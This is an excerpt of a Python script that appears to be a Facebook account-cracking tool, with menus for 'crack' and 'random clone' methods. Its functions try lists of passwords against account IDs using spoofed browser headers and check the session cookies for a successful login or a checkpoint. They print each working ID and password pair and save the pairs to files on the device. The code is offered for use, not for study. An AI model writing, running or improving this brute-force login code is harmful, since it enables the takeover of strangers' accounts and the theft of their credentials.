...
def fia():    
			print(logo)
			print('\x1b[1;91m⧼ WORKING ⧽ :\x1b[1;92m THIS IS PIAD TOOLS DO NOT UES BYPASS ')
			linex()
			print('[1] Crack File Clone\n[2] Pakistan Random Clone\n[0] Exit')
			linex()
			...
			if xd in ['1','01']:
				...
				print(logo)
				print('\033[1;37m--------------------------------------------------')
				print('\033[1;92m      ------ > ALL METHOD UPDATED < --------')
				linex()
				print('[1] Method 1 \n[2] Method 2 ')
				linex()
				mthd=input(' Choose: ')
				...
				os.system('python RIYAD.py')
			elif xd in ['2','02']:
				menu()
			elif xd in ['3','03']:
				bd()
			elif xd in ['4','04']:
				os.system(f'xdg-open https://www.facebook.com/gsriyad11');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[RIYAD / GS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			GSRIYAD=session.cookies.get_dict().keys()
			if "c_user" in GSRIYAD:
				print('\r\r\033[1;31m[MD RIYAD-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/MD RIYAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in GSRIYAD:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[MD RIYAD-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/MD RIYAD-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[MD RIYAD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in GSRIYAD:
				...
				print('\r\r\033[1;32m[MD RIYAD-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[MD RIYAD-CP] '+ids+' | '+pas+'\033[1;97m')
...
def menu():
	...
	print('\033[1;92m      ------ > ALL METHOD UPDATED < --------')
	print('\033[1;37m--------------------------------------------------')
	print('[1] Crack Method ')
	print('[2] Crack Method ')
	print('[3] Crack Method ')
	linex()
...
def random_number1():
	...
	print(logo)
	print('\033[1;37m--------------------------------------------------')
	print('\033[1;37m Limit 10000 , 20000 , 30000 ,  40000, 50000...  ')
	print('\033[1;37m--------------------------------------------------')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mMD RIYAD / GS\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
            ...
            'sec-ch-ua': '"Google Chrome";v="3", "Chromium";v="3", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[MD RIYAD-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[MD RIYAD-OK] '+cid+' | '+ps+'\33[0;97m')
